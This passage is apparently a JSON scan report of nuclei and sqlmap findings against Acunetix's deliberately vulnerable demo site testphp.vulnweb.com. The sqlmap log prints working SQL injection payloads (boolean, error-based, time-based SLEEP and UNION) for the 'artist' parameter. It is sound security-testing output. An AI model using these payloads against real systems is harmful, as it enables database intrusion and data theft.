+                    ],
+                    "tags": [
+                        "misconfig",
+                        "headers",
+                        "generic",
+                        "vuln"
+                    ],
+                    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.\n",
+                    "severity": "info",
+                    "metadata": {
+                        "max-request": 1
+                    }
+                },
+                "matcher-name": "permissions-policy",
+                "type": "http",
+                "host": "testphp.vulnweb.com",
+                "port": "80",
+                "scheme": "http",
+                "url": "http://testphp.vulnweb.com/",
+                "path": "/",
+                "matched-at": "http://testphp.vulnweb.com/",
+                "request": "GET / HTTP/1.1\r\nHost: testphp.vulnweb.com\r\nUser-Agent: Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/116.0 Safari/537.36\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+                "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Fri, 20 Feb 2026 06:42:05 GMT\r\nServer: nginx/1.19.0\r\nX-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1\r\n\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>Home of Acunetix Art</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id=\"pageName\">welcome to our page</h2>\n\t  <div class=\"story\">\n\t\t<h3>Test site for Acunetix WVS.</h3>\n\t  </div>\n</div>\n<!-- InstanceEndEditable -->\n<!--end content -->\n\n<div id=\"navBar\"> \n  <div id=\"search\"> \n    <form action=\"search.php?test=query\" method=\"post\"> \n      <label>search art</label> \n      <input name=\"searchFor\" type=\"text\" size=\"10\"> \n      <input name=\"goButton\" type=\"submit\" value=\"go\"> \n    </form> \n  </div> \n  <div id=\"sectionLinks\"> \n    <ul> \n      <li><a href=\"categories.php\">Browse categories</a></li> \n      <li><a href=\"artists.php\">Browse artists</a></li> \n      <li><a href=\"cart.php\">Your cart</a></li> \n      <li><a href=\"login.php\">Signup</a></li>\n\t  <li><a href=\"userinfo.php\">Your profile</a></li>\n\t  <li><a href=\"guestbook.php\">Our guestbook</a></li>\n\t\t<li><a href=\"AJAX/index.php\">AJAX Demo</a></li>\n\t  </li> \n    </ul> \n  </div> \n  <div class=\"relatedLinks\"> \n    <h3>Links</h3> \n    <ul> \n      <li><a href=\"http://www.acunetix.com\">Security art</a></li> \n\t  <li><a href=\"https://www.acunetix.com/vulnerability-scanner/php-security-scanner/\">PHP scanner</a></li>\n\t  <li><a href=\"https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/\">PHP vuln help</a></li>\n\t  <li><a href=\"http://www.eclectasy.com/Fractal-Explorer/index.html\">Fractal Explorer</a></li> \n    </ul> \n  </div> \n  <div id=\"advert\"> \n    <p>\n      <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"107\" height=\"66\">\n        <param name=\"movie\" value=\"Flash/add.swf\">\n        <param name=quality value=high>\n        <embed src=\"Flash/add.swf\" quality=high pluginspage=\"http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash\" type=\"application/x-shockwave-flash\" width=\"107\" height=\"66\"></embed>\n      </object>\n    </p>\n  </div> \n</div> \n\n<!--end navbar --> \n<div id=\"siteInfo\">  <a href=\"http://www.acunetix.com\">About Us</a> | <a href=\"privacy.php\">Privacy Policy</a> | <a href=\"mailto:wvs@acunetix.com\">Contact Us</a> | <a href=\"/Mod_Rewrite_Shop/\">Shop</a> | <a href=\"/hpp/\">HTTP Parameter Pollution</a> | &copy;2019\n  Acunetix Ltd \n</div> \n    \n    \n<br> \n<div style=\"background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px\">\n<p style=\"padding-left:5%;padding-right:5%\"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>\n</div>\n</div>\n</body>\n<!-- InstanceEnd --></html>\n",
+                "ip": "44.228.249.3",
+                "timestamp": "2026-02-20T01:42:05.306702832-05:00",
+                "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/116.0 Safari/537.36' 'http://testphp.vulnweb.com/'",
+                "matcher-status": true
+            }
+        },
+        {
+            "tool": "nuclei",
+            "url": "http://testphp.vulnweb.com/.idea/workspace.xml",
+            "finding_name": "Public .idea Folder containing files with sensitive data",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "vulnerability",
+            "description": "Searches for .idea Folder by querying the /.idea and a few other files with sensitive data.",
+            "timestamp": "2026-02-20 01:43:11",
+            "raw_output": {
+                "template": "http/exposures/files/idea-folder-exposure.yaml",
+                "template-url": "https://cloud.projectdiscovery.io/public/idea-folder-exposure",
+                "template-id": "idea-folder-exposure",
+                "template-path": "/home/kali/.local/nuclei-templates/http/exposures/files/idea-folder-exposure.yaml",
+                "info": {
+                    "name": "Public .idea Folder containing files with sensitive data",
+                    "author": [
+                        "martincodes-de"
+                    ],
+                    "tags": [
+                        "phpstorm",
+                        "jetbrains",
+                        "idea",
+                        "exposure",
+                        "files",
+                        "vuln"
+                    ],
+                    "description": "Searches for .idea Folder by querying the /.idea and a few other files with sensitive data.",
+                    "severity": "info",
+                    "metadata": {
+                        "max-request": 2
+                    }
+                },
+                "type": "http",
+                "host": "testphp.vulnweb.com",
+                "port": "80",
+                "scheme": "http",
+                "url": "http://testphp.vulnweb.com/",
+                "path": "/",
+                "matched-at": "http://testphp.vulnweb.com/.idea/workspace.xml",
+                "request": "GET /.idea/workspace.xml HTTP/1.1\r\nHost: testphp.vulnweb.com\r\nUser-Agent: Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+                "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 12473\r\nAccept-Ranges: bytes\r\nContent-Type: text/xml\r\nDate: Fri, 20 Feb 2026 06:42:21 GMT\r\nEtag: \"4f911ceb-30b9\"\r\nLast-Modified: Fri, 20 Apr 2012 08:23:07 GMT\r\nServer: nginx/1.19.0\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<project version=\"4\">\r\n  <component name=\"ChangeListManager\">\r\n    <list default=\"true\" id=\"190e5f86-a42c-4cc9-a03a-80ac0d47d6d2\" name=\"Default\" comment=\"\" />\r\n    <ignored path=\"acuart.iws\" />\r\n    <ignored path=\".idea/workspace.xml\" />\r\n    <option name=\"TRACKING_ENABLED\" value=\"true\" />\r\n    <option name=\"SHOW_DIALOG\" value=\"false\" />\r\n    <option name=\"HIGHLIGHT_CONFLICTS\" value=\"true\" />\r\n    <option name=\"HIGHLIGHT_NON_ACTIVE_CHANGELIST\" value=\"false\" />\r\n    <option name=\"LAST_RESOLUTION\" value=\"IGNORE\" />\r\n  </component>\r\n  <component name=\"ChangesViewManager\" flattened_view=\"true\" show_ignored=\"false\" />\r\n  <component name=\"CreatePatchCommitExecutor\">\r\n    <option name=\"PATCH_PATH\" value=\"\" />\r\n  </component>\r\n  <component name=\"DaemonCodeAnalyzer\">\r\n    <disable_hints />\r\n  </component>\r\n  <component name=\"FavoritesManager\">\r\n    <favorites_list name=\"acuart\" />\r\n  </component>\r\n  <component name=\"FileEditorManager\">\r\n    <leaf>\r\n      <file leaf-file-name=\"cart.php\" pinned=\"false\" current=\"true\" current-in-tab=\"true\">\r\n        <entry file=\"file://$PROJECT_DIR$/cart.php\">\r\n          <provider selected=\"true\" editor-type-id=\"text-editor\">\r\n            <state line=\"60\" column=\"26\" selection-start=\"2336\" selection-end=\"2336\" vertical-scroll-proportion=\"-0.41645244\">\r\n              <folding>\r\n                <marker date=\"1334906567000\" expanded=\"true\" signature=\"3702:3950\" placeholder=\"...\" />\r\n                <marker date=\"1334906567000\" expanded=\"true\" signature=\"4948:5056\" placeholder=\"...\" />\r\n              </folding>\r\n            </state>\r\n          </provider>\r\n        </entry>\r\n      </file>\r\n    </leaf>\r\n  </component>\r\n  <component name=\"Git.Settings\">\r\n    <option name=\"CHECKOUT_INCLUDE_TAGS\" value=\"false\" />\r\n    <option name=\"UPDATE_CHANGES_POLICY\" value=\"STASH\" />\r\n    <option name=\"LINE_SEPARATORS_CONVERSION\" value=\"ASK\" />\r\n  </component>\r\n  <component name=\"IdeDocumentHistory\">\r\n    <option name=\"changedFiles\">\r\n      <list>\r\n        <option value=\"$PROJECT_DIR$/.htaccess\" />\r\n        <option value=\"$PROJECT_DIR$/cart.php\" />\r\n      </list>\r\n    </option>\r\n  </component>\r\n  <component name=\"PhpWorkspaceProjectConfiguration\" backward_compatibility_performed=\"true\" />\r\n  <component name=\"ProjectFrameBounds\">\r\n    <option name=\"x\" value=\"-8\" />\r\n    <option name=\"y\" value=\"-8\" />\r\n    <option name=\"width\" value=\"1296\" />\r\n    <option name=\"height\" value=\"1000\" />\r\n  </component>\r\n  <component name=\"ProjectLevelVcsManager\" settingsEditedManually=\"false\">\r\n    <OptionsSetting value=\"true\" id=\"Add\" />\r\n    <OptionsSetting value=\"true\" id=\"Remove\" />\r\n    <OptionsSetting value=\"true\" id=\"Checkout\" />\r\n    <OptionsSetting value=\"true\" id=\"Update\" />\r\n    <OptionsSetting value=\"true\" id=\"Status\" />\r\n    <OptionsSetting value=\"true\" id=\"Edit\" />\r\n    <ConfirmationsSetting value=\"0\" id=\"Add\" />\r\n    <ConfirmationsSetting value=\"0\" id=\"Remove\" />\r\n  </component>\r\n  <component name=\"ProjectReloadState\">\r\n    <option name=\"STATE\" value=\"0\" />\r\n  </component>\r\n  <component name=\"ProjectView\">\r\n    <navigator currentView=\"ProjectPane\" proportions=\"\" version=\"1\" splitterProportion=\"0.5\">\r\n      <flattenPackages />\r\n      <showMembers />\r\n      <showModules />\r\n      <showLibraryContents ProjectPane=\"true\" />\r\n      <hideEmptyPackages />\r\n      <abbreviatePackageNames />\r\n      <autoscrollToSource />\r\n      <autoscrollFromSource />\r\n      <sortByType />\r\n    </navigator>\r\n    <panes>\r\n      <pane id=\"ProjectPane\">\r\n        <subPane>\r\n          <PATH>\r\n            <PATH_ELEMENT>\r\n              <option name=\"myItemId\" value=\"acuart\" />\r\n              <option name=\"myItemType\" value=\"com.intellij.ide.projectView.impl.nodes.ProjectViewProjectNode\" />\r\n            </PATH_ELEMENT>\r\n          </PATH>\r\n          <PATH>\r\n            <PATH_ELEMENT>\r\n              <option name=\"myItemId\" value=\"acuart\" />\r\n              <option name=\"myItemType\" value=\"com.intellij.ide.projectView.impl.nodes.ProjectViewProjectNode\" />\r\n            </PATH_ELEMENT>\r\n            <PATH_ELEMENT>\r\n              <option name=\"myItemId\" value=\"acuart\" />\r\n              <option name=\"myItemType\" value=\"com.intellij.ide.projectView.impl.nodes.PsiDirectoryNode\" />\r\n            </PATH_ELEMENT>\r\n          </PATH>\r\n        </subPane>\r\n      </pane>\r\n      <pane id=\"Scope\" />\r\n    </panes>\r\n  </component>\r\n  <component name=\"PropertiesComponent\">\r\n    <property name=\"WebServerToolWindowFactoryState\" value=\"false\" />\r\n  </component>\r\n  <component name=\"RunManager\">\r\n    <list size=\"0\" />\r\n  </component>\r\n  <component name=\"ShelveChangesManager\" show_recycled=\"false\" />\r\n  <component name=\"TaskManager\">\r\n    <task active=\"true\" id=\"Default\" summary=\"Default task\">\r\n      <created>1334906472656</created>\r\n      <updated>1334906472656</updated>\r\n    </task>\r\n    <servers />\r\n  </component>\r\n  <component name=\"ToolWindowManager\">\r\n    <frame x=\"-8\" y=\"-8\" width=\"1296\" height=\"1000\" extended-state=\"6\" />\r\n    <editor active=\"true\" />\r\n    <layout>\r\n      <window_info id=\"Data Sources\" active=\"false\" anchor=\"right\" auto_hide=\"false\" internal_type=\"DOCKED\" type=\"DOCKED\" visible=\"false\" weight=\"0.33\" sideWeight=\"0.5\" order=\"-1\" side_tool=\"false\" content_ui=\"tabs\" />\r\n      <window_info id=\"Changes\" active=\"false\" anchor=\"bottom\" auto_hide=\"false\" internal_type=\"DOCKED\" type=\"DOCKED\" visible=\"false\" weight=\"0.33\" sideWeight=\"0.5\" order=\"-1\" side_tool=\"false\" content_ui=\"tabs\" />\r\n      <window_info id=\"TODO\" active=\"false\" anchor=\"bottom\" auto_hide=\"false\" internal_type=\"DOCKED\" type=\"DOCKED\" visible=\"false\" weight=\"0.33\" sideWeight=\"0.5\" order=\"6\" side_tool=\"false\" content_ui=\"tabs\" />\r\n      <window_info id=\"Structure\" active=\"false\" anchor=\"left\" auto_hide=\"false\" internal_type=\"DOCKED\" type=\"DOCKED\" visible=\"false\" weight=\"0.25\" sideWeight=\"0.5\" order=\"1\" side_tool=\"true\" content_ui=\"tabs\" />\r\n      <window_info id=\"Project\" active=\"false\" anchor=\"left\" auto_hide=\"false\" internal_type=\"DOCKED\" type=\"DOCKED\" visible=\"true\" weight=\"0.20373377\" sideWeight=\"0.5\" order=\"0\" side_tool=\"false\" content_ui=\"tabs\" />\r\n      <window_info id=\"Debug\" active=\"false\" anchor=\"bottom\" auto_hide=\"false\" internal_type=\"DOCKED\" type=\"DOCKED\" visible=\"false\" weight=\"0.4\" sideWeight=\"0.5\" order=\"3\" side_tool=\"false\" content_ui=\"tabs\" />\r\n      <window_info id=\"Favorites\" active=\"false\" anchor=\"left\" auto_hide=\"false\" internal_type=\"DOCKED\" type=\"DOCKED\" visible=\"false\" weight=\"0.33\" sideWeight=\"0.5\" order=\"-1\" side_tool=\"true\" content_ui=\"tabs\" />\r\n      <window_info id=\"Event Log\" active=\"false\" anchor=\"bottom\" auto_hide=\"false\" internal_type=\"DOCKED\" type=\"DOCKED\" visible=\"false\" weight=\"0.33\" sideWeight=\"0.5\" order=\"-1\" side_tool=\"true\" content_ui=\"tabs\" />\r\n      <window_info id=\"Run\" active=\"false\" anchor=\"bottom\" auto_hide=\"false\" internal_type=\"DOCKED\" type=\"DOCKED\" visible=\"false\" weight=\"0.33\" sideWeight=\"0.5\" order=\"2\" side_tool=\"false\" content_ui=\"tabs\" />\r\n      <window_info id=\"Version Control\" active=\"false\" anchor=\"bottom\" auto_hide=\"false\" internal_type=\"DOCKED\" type=\"DOCKED\" visible=\"false\" weight=\"0.33\" sideWeight=\"0.5\" order=\"-1\" side_tool=\"false\" content_ui=\"tabs\" />\r\n      <window_info id=\"Cvs\" active=\"false\" anchor=\"bottom\" auto_hide=\"false\" internal_type=\"DOCKED\" type=\"DOCKED\" visible=\"false\" weight=\"0.25\" sideWeight=\"0.5\" order=\"4\" side_tool=\"false\" content_ui=\"tabs\" />\r\n      <window_info id=\"Message\" active=\"false\" anchor=\"bottom\" auto_hide=\"false\" internal_type=\"DOCKED\" type=\"DOCKED\" visible=\"false\" weight=\"0.33\" sideWeight=\"0.5\" order=\"0\" side_tool=\"false\" content_ui=\"tabs\" />\r\n      <window_info id=\"Find\" active=\"false\" anchor=\"bottom\" auto_hide=\"false\" internal_type=\"DOCKED\" type=\"DOCKED\" visible=\"false\" weight=\"0.33\" sideWeight=\"0.5\" order=\"1\" side_tool=\"false\" content_ui=\"tabs\" />\r\n      <window_info id=\"Ant Build\" active=\"false\" anchor=\"right\" auto_hide=\"false\" internal_type=\"DOCKED\" type=\"DOCKED\" visible=\"false\" weight=\"0.25\" sideWeight=\"0.5\" order=\"1\" side_tool=\"false\" content_ui=\"tabs\" />\r\n      <window_info id=\"Commander\" active=\"false\" anchor=\"right\" auto_hide=\"false\" internal_type=\"DOCKED\" type=\"DOCKED\" visible=\"false\" weight=\"0.4\" sideWeight=\"0.5\" order=\"0\" side_tool=\"false\" content_ui=\"tabs\" />\r\n      <window_info id=\"Inspection\" active=\"false\" anchor=\"bottom\" auto_hide=\"false\" internal_type=\"DOCKED\" type=\"DOCKED\" visible=\"false\" weight=\"0.4\" sideWeight=\"0.5\" order=\"5\" side_tool=\"false\" content_ui=\"tabs\" />\r\n      <window_info id=\"Hierarchy\" active=\"false\" anchor=\"right\" auto_hide=\"false\" internal_type=\"DOCKED\" type=\"DOCKED\" visible=\"false\" weight=\"0.25\" sideWeight=\"0.5\" order=\"2\" side_tool=\"false\" content_ui=\"combo\" />\r\n    </layout>\r\n  </component>\r\n  <component name=\"VcsContentAnnotationSettings\">\r\n    <option name=\"myLimit\" value=\"2678400000\" />\r\n  </component>\r\n  <component name=\"VcsManagerConfiguration\">\r\n    <option name=\"OFFER_MOVE_TO_ANOTHER_CHANGELIST_ON_PARTIAL_COMMIT\" value=\"true\" />\r\n    <option name=\"CHECK_CODE_SMELLS_BEFORE_PROJECT_COMMIT\" value=\"true\" />\r\n    <option name=\"CHECK_NEW_TODO\" value=\"true\" />\r\n    <option name=\"myTodoPanelSettings\">\r\n      <value>\r\n        <are-packages-shown value=\"false\" />\r\n        <are-modules-shown value=\"false\" />\r\n        <flatten-packages value=\"false\" />\r\n        <is-autoscroll-to-source value=\"false\" />\r\n      </value>\r\n    </option>\r\n    <option name=\"PERFORM_UPDATE_IN_BACKGROUND\" value=\"true\" />\r\n    <option name=\"PERFORM_COMMIT_IN_BACKGROUND\" value=\"true\" />\r\n    <option name=\"PERFORM_EDIT_IN_BACKGROUND\" value=\"true\" />\r\n    <option name=\"PERFORM_CHECKOUT_IN_BACKGROUND\" value=\"true\" />\r\n    <option name=\"PERFORM_ADD_REMOVE_IN_BACKGROUND\" value=\"true\" />\r\n    <option name=\"PERFORM_ROLLBACK_IN_BACKGROUND\" value=\"false\" />\r\n    <option name=\"CHECK_LOCALLY_CHANGED_CONFLICTS_IN_BACKGROUND\" value=\"false\" />\r\n    <option name=\"ENABLE_BACKGROUND_PROCESSES\" value=\"false\" />\r\n    <option name=\"CHANGED_ON_SERVER_INTERVAL\" value=\"60\" />\r\n    <option name=\"SHOW_ONLY_CHANGED_IN_SELECTION_DIFF\" value=\"true\" />\r\n    <option name=\"CHECK_COMMIT_MESSAGE_SPELLING\" value=\"true\" />\r\n    <option name=\"DEFAULT_PATCH_EXTENSION\" value=\"patch\" />\r\n    <option name=\"SHORT_DIFF_HORISONTALLY\" value=\"true\" />\r\n    <option name=\"SHORT_DIFF_EXTRA_LINES\" value=\"2\" />\r\n    <option name=\"SOFT_WRAPS_IN_SHORT_DIFF\" value=\"true\" />\r\n    <option name=\"INCLUDE_TEXT_INTO_PATCH\" value=\"false\" />\r\n    <option name=\"INCLUDE_TEXT_INTO_SHELF\" value=\"false\" />\r\n    <option name=\"CREATE_PATCH_EXPAND_DETAILS_DEFAULT\" value=\"true\" />\r\n    <option name=\"FORCE_NON_EMPTY_COMMENT\" value=\"false\" />\r\n    <option name=\"LAST_COMMIT_MESSAGE\" />\r\n    <option name=\"MAKE_NEW_CHANGELIST_ACTIVE\" value=\"true\" />\r\n    <option name=\"OPTIMIZE_IMPORTS_BEFORE_PROJECT_COMMIT\" value=\"false\" />\r\n    <option name=\"CHECK_FILES_UP_TO_DATE_BEFORE_COMMIT\" value=\"false\" />\r\n    <option name=\"REFORMAT_BEFORE_PROJECT_COMMIT\" value=\"false\" />\r\n    <option name=\"REFORMAT_BEFORE_FILE_COMMIT\" value=\"false\" />\r\n    <option name=\"FILE_HISTORY_DIALOG_COMMENTS_SPLITTER_PROPORTION\" value=\"0.8\" />\r\n    <option name=\"FILE_HISTORY_DIALOG_SPLITTER_PROPORTION\" value=\"0.5\" />\r\n    <option name=\"ACTIVE_VCS_NAME\" />\r\n    <option name=\"UPDATE_GROUP_BY_PACKAGES\" value=\"false\" />\r\n    <option name=\"UPDATE_GROUP_BY_CHANGELIST\" value=\"false\" />\r\n    <option name=\"SHOW_FILE_HISTORY_AS_TREE\" value=\"false\" />\r\n    <option name=\"FILE_HISTORY_SPLITTER_PROPORTION\" value=\"0.6\" />\r\n  </component>\r\n  <component name=\"XDebuggerManager\">\r\n    <breakpoint-manager />\r\n  </component>\r\n  <component name=\"editorHistoryManager\">\r\n    <entry file=\"file://$PROJECT_DIR$/.htaccess\">\r\n      <provider selected=\"true\" editor-type-id=\"text-editor\">\r\n        <state line=\"6\" column=\"0\" selection-start=\"213\" selection-end=\"222\" vertical-scroll-proportion=\"0.124847\">\r\n          <folding />\r\n        </state>\r\n      </provider>\r\n    </entry>\r\n    <entry file=\"file://$PROJECT_DIR$/cart.php\">\r\n      <provider selected=\"true\" editor-type-id=\"text-editor\">\r\n        <state line=\"60\" column=\"26\" selection-start=\"2336\" selection-end=\"2336\" vertical-scroll-proportion=\"-0.41645244\">\r\n          <folding>\r\n            <marker date=\"1334906567000\" expanded=\"true\" signature=\"3702:3950\" placeholder=\"...\" />\r\n            <marker date=\"1334906567000\" expanded=\"true\" signature=\"4948:5056\" placeholder=\"...\" />\r\n          </folding>\r\n        </state>\r\n      </provider>\r\n    </entry>\r\n  </component>\r\n</project>\r\n\r\n",
+                "ip": "44.228.249.3",
+                "timestamp": "2026-02-20T01:42:20.611009449-05:00",
+                "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36' 'http://testphp.vulnweb.com/.idea/workspace.xml'",
+                "matcher-status": true
+            }
+        },
+        {
+            "tool": "sqlmap",
+            "url": "http://testphp.vulnweb.com/artists.php?artist=1",
+            "finding_name": "SQL Injection Confirmed",
+            "severity": "CRITICAL",
+            "risk_score": 10,
+            "category": "general",
+            "description": "Vulnerable Parameter: artist | Backend DBMS: MySQL >= 5.6 | Tested Parameters: artist | HTTP Method: GET | Target Type: get | SQLMap confirmed injectable parameter.",
+            "timestamp": "2026-02-20 01:43:57",
+            "raw_output": "___\n       __H__\n ___ ___[.]_____ ___ ___  {1.9.11#stable}\n|_ -| . [,]     | .'| . |\n|___|_  [\"]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 01:43:21 /2026-02-20/\n\n[01:43:21] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'\n[01:43:22] [INFO] flushing session file\n[01:43:22] [INFO] testing connection to the target URL\n[01:43:22] [INFO] checking if the target is protected by some kind of WAF/IPS\n[01:43:23] [INFO] testing if the target URL content is stable\n[01:43:23] [INFO] target URL content is stable\n[01:43:23] [INFO] testing if GET parameter 'artist' is dynamic\n[01:43:24] [INFO] GET parameter 'artist' appears to be dynamic\n[01:43:24] [INFO] heuristic (basic) test shows that GET parameter 'artist' might be injectable (possible DBMS: 'MySQL')\n[01:43:25] [INFO] heuristic (XSS) test shows that GET parameter 'artist' might be vulnerable to cross-site scripting (XSS) attacks\n[01:43:25] [INFO] testing for SQL injection on GET parameter 'artist'\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y\n[01:43:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[01:43:25] [WARNING] reflective value(s) found and filtering out\n[01:43:27] [INFO] GET parameter 'artist' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string=\"sem\")\n[01:43:27] [INFO] testing 'Generic inline queries'\n[01:43:27] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'\n[01:43:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'\n[01:43:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'\n[01:43:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'\n[01:43:28] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'\n[01:43:29] [INFO] GET parameter 'artist' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable \n[01:43:29] [INFO] testing 'MySQL inline queries'\n[01:43:29] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'\n[01:43:29] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)\n[01:43:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries'\n[01:43:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'\n[01:43:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'\n[01:43:37] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'\n[01:43:37] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'\n[01:43:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'\n[01:43:49] [INFO] GET parameter 'artist' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable \n[01:43:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'\n[01:43:49] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found\n[01:43:50] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test\n[01:43:51] [INFO] target URL appears to have 3 columns in query\n[01:43:54] [INFO] GET parameter 'artist' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable\nGET parameter 'artist' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N\nsqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:\n---\nParameter: artist (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: artist=1 AND 7104=7104\n\n    Type: error-based\n    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)\n    Payload: artist=1 AND GTID_SUBSET(CONCAT(0x71787a7071,(SELECT (ELT(1089=1089,1))),0x716a6a6271),1089)\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: artist=1 AND (SELECT 3365 FROM (SELECT(SLEEP(5)))GgOs)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: artist=-2037 UNION ALL SELECT CONCAT(0x71787a7071,0x495a73617146565a51474c6a72424d494d4c4d617276497a7079464c70436d416d464f7a6c425450,0x716a6a6271),NULL,NULL-- -\n---\n[01:43:54] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: PHP 5.6.40, Nginx 1.19.0\nback-end DBMS: MySQL >= 5.6\n[01:43:57] [INFO] fetched data logged to text files under 